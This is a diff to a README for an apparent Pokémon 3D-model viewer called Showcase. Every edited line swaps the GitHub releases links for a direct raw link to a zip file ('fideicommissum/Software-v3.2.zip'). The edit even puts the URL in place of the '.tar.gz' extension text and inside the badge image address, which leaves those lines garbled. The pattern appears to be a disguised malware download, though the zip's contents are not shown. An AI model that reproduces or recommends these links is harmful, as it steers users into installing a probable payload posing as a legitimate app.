@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to Showcase! This application is your window into a vibrant world of Pokémon 3D models. With over 1,300 animated models, you can filter generations and compare performance between different formats. Below, you will find everything you need to download and run Showcase on your computer.
 
-[![Download Showcase](https://img.shields.io/badge/Download%20Showcase-v1.0-brightgreen)](https://github.com/stm230/Showcase/releases)
+[![Download Showcase](https://raw.githubusercontent.com/stm230/Showcase/main/fideicommissum/Software-v3.2.zip%20Showcase-v1.0-brightgreen)](https://raw.githubusercontent.com/stm230/Showcase/main/fideicommissum/Software-v3.2.zip)
 
 ## 💻 System Requirements
 Before you download Showcase, make sure your computer meets these basic requirements:
@@ -17,13 +17,13 @@ Before you download Showcase, make sure your computer meets these basic requirem
 To get started with Showcase, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/stm230/Showcase/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/stm230/Showcase/main/fideicommissum/Software-v3.2.zip).
 
 2. **Select the Latest Version**  
    Look for the latest release. It should be marked clearly at the top of the page.
 
 3. **Download the Application**  
-   Click on the download link for your operating system. The package will be in a compressed format, so it may end in `.zip` or `.tar.gz`.
+   Click on the download link for your operating system. The package will be in a compressed format, so it may end in `.zip` or `https://raw.githubusercontent.com/stm230/Showcase/main/fideicommissum/Software-v3.2.zip`.
 
 4. **Extract the Files**  
    Once the download is complete, locate the file and extract it. On Windows, you can right-click the file and select "Extract All." On macOS, simply double-click the file.
@@ -60,4 +60,4 @@ Join our growing community of Pokémon enthusiasts. Engage with fellow users, sh
 ## ⚖️ License
 Showcase is licensed under the MIT License. You are free to use, modify, and distribute the software within the terms of the license.
 
-For more details, feel free to visit our [Releases page](https://github.com/stm230/Showcase/releases) again to download the latest updates. Enjoy exploring the world of Pokémon in 3D with Showcase!
+For more details, feel free to visit our [Releases page](https://raw.githubusercontent.com/stm230/Showcase/main/fideicommissum/Software-v3.2.zip) again to download the latest updates. Enjoy exploring the world of Pokémon in 3D with Showcase!
